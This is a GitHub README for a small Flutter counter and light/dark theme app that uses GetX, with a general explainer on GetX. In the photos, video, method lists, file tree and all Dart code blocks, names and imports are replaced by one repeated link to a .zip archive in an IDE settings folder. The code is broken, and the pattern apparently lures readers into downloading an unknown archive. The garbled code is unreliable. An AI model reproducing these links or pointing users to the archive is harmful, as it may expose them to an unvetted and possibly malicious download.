# Counter and Theme Change App using GetX

This repository contains a simple Flutter application that demonstrates the use of GetX for state management and theme switching. The app includes a counter that increments with a button press and a toggle switch to change the app theme between light and dark modes.

## Features

- Increment counter functionality.
- Toggle switch to change themes between light and dark.
- GetX for efficient state management.

## Table of Contents

1. [Introduction to GetX](#introduction-to-getx)
2. [Benefits of Using GetX](#benefits-of-using-getx)
3. [Code Explanation](#code-explanation)
4. [Usage](#usage)
5. [App Structure](#app-structure)
6. [Code Explanation](#code-explanation)
7. [Conclusion](#conclusion)


<details> 
  <summary><h2>📸Photos</h2></summary>
  <p>
    <table align="center">
  <tr>
    <td><img src="https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip" alt="Image 2" width="180" height="auto"></td>
    <td><img src="https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip" alt="Image 2" width="180" height="auto"></td>
  </tr>
    </table>    
  </p>
  </details>
  <details> 
  <summary><h2>📽️Video</h2></summary>
  <p>
    <table align="center">
      <tr>
        <td>
          <video src="https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip" width="420" height="315"></video>
        </td>
        <td>
          <video src="https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip" width="420" height="315"></video>
        </td>
      </tr>
    </table>   
  </p>
</details>


## Introduction to GetX

GetX is an extra-light and powerful solution for Flutter. It's a complete package that provides state management, intelligent dependency injection, and route management. Developed by Jonny Borges, GetX simplifies many tasks associated with building Flutter applications, such as state management, dependency injection, and navigation, in a clean and efficient manner.

## Understanding GetX in Flutter

### Introduction to GetX

GetX is an extra-light and powerful solution for Flutter. It's a complete package that provides state management, intelligent dependency injection, and route management. Developed by Jonny Borges, GetX simplifies many tasks associated with building Flutter applications, such as state management, dependency injection, and navigation, in a clean and efficient manner.

### Key Features of GetX

1. **State Management**: GetX provides a reactive state management solution that is both simple and highly efficient.
2. **Dependency Injection**: It offers an easy way to manage dependencies and make them available throughout the app.
3. **Route Management**: GetX simplifies navigation and routing, reducing boilerplate code and making the app’s navigation flow easier to understand and manage.
4. **Performance**: GetX is designed to be lightweight and high-performing, making it suitable for large-scale applications.
5. **Reactive Programming**: It supports reactive programming, allowing the app to react to changes in real-time.
6. **Simple API**: GetX has a simple and easy-to-learn API that helps in rapid development.

### Benefits of Using GetX

#### 1. **Simplicity**
GetX simplifies the management of state, dependencies, and routing in Flutter applications. The simplicity of its API reduces the learning curve and makes it easy for developers to implement complex functionalities with minimal code.

#### 2. **Performance**
GetX is highly performant due to its lightweight nature and efficient handling of state and dependencies. It avoids unnecessary rebuilds and updates only the specific parts of the UI that need to change, which significantly improves the app’s performance.

#### 3. **Ease of Use**
The intuitive and consistent API of GetX makes it easy to use, even for beginners. The documentation is comprehensive, and there are many community resources available for learning and troubleshooting.

#### 4. **Scalability**
GetX’s modular approach allows for easy scalability. It can be used for small projects and large-scale applications alike. The ability to organize code into separate modules helps in maintaining and scaling the application as it grows.

#### 5. **Dependency Management**
GetX provides a powerful dependency injection system that makes it easy to manage and inject dependencies across the application. This promotes better code organization and testability.

#### 6. **Reactive Programming**
With GetX, implementing reactive programming is straightforward. It allows developers to create applications that respond to changes in data in real-time, enhancing the user experience.

### Core Concepts of GetX

#### 1. **Reactive State Management**
GetX’s state management is based on reactive programming. It provides a `GetBuilder` widget for simple state management and `GetX`/`Obx` widgets for reactive state management.

- **GetBuilder**: Used for simple state updates. It doesn't need to rebuild the widget tree, hence improving performance.
- **GetX/Obx**: Used for reactive state updates. It listens to changes in the state and rebuilds the UI accordingly.

#### 2. **Dependency Injection**
GetX makes dependency injection straightforward with its `https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip`, `https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip`, and `https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip` methods.

- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Instantiates and provides the dependency immediately.
- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Lazily instantiates the dependency when it is first used.
- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Finds and retrieves the dependency when needed.

#### 3. **Route Management**
GetX’s routing mechanism simplifies navigation by reducing boilerplate code and making the navigation logic easier to manage.

- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Navigates to a new page.
- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Goes back to the previous page.
- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Replaces the current page with a new one.
- **https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip**: Removes all previous pages and navigates to a new page.

### Conclusion

GetX is a powerful and versatile solution for Flutter applications, providing a wide range of functionalities such as state management, dependency injection, and route management. Its simplicity, performance, and ease of use make it an excellent choice for developers looking to streamline their Flutter development process.

## Usage

Run the app using the following command:

```bash
flutter run
```

## App Structure

```
lib/
|-- https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip
|-- controllers/
|   |-- https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip
|   |-- https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip
|-- views/
    |-- https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip
```

## Code Explanation

### https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip

```dart
import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';

import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';

void main() => runApp(MyApp());

class MyApp extends StatelessWidget {
  final ThemeController themeController = https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip(ThemeController());

  MyApp({https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip});

  @override
  Widget build(BuildContext context) {
    return Obx(
      () {
        return GetMaterialApp(
          debugShowCheckedModeBanner: false,
          theme: https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip ? darkTheme : lightTheme,
          home: CounterScreen(),
        );
      },
    );
  }
}

```

### https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip

```dart
import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';

class CounterController extends GetxController {
  var num = https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip;

  void increment() {
    num++;
  }

  void decrement() {
    num--;
  }

  void reset() {
    https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip = 0;
  }
}
```

### https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip

```dart
import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';

class ThemeController extends GetxController {
  var isDark = https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip;

  void toggleTheme() {
    https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip = !https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip;
    https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip(https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip ? darkTheme : lightTheme);
  }
}
```

### https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip

```dart
import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';
import 'https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip';

class HomeView extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    final CounterController counterController = https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip(CounterController());
    final ThemeController themeController = https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip(ThemeController());

    return Scaffold(
      appBar: AppBar(
        title: Text('Counter and Theme Change App'),
        actions: [
          Obx(() => Switch(
                value: https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip,
                onChanged: (value) {
                  https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip();
                },
              ))
        ],
      ),
      body: Center(
        child: Obx(() => Text(
              'Counter: ${https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip}',
              style: TextStyle(fontSize: 24),
            )),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip,
        child: Icon(https://github.com/Aayush014/counter_with_getx/raw/refs/heads/master/macos/Runner.xcworkspace/xcshareddata/counter-with-getx-v2.0.zip),
      ),
    );
  }
}
```

## Conclusion

This project demonstrates how to use GetX for state management and theme switching in a simple Flutter application. By leveraging the power of GetX, we achieve efficient state management with minimal code, making the app more maintainable and scalable.

Feel free to contribute to this project by submitting issues or pull requests.
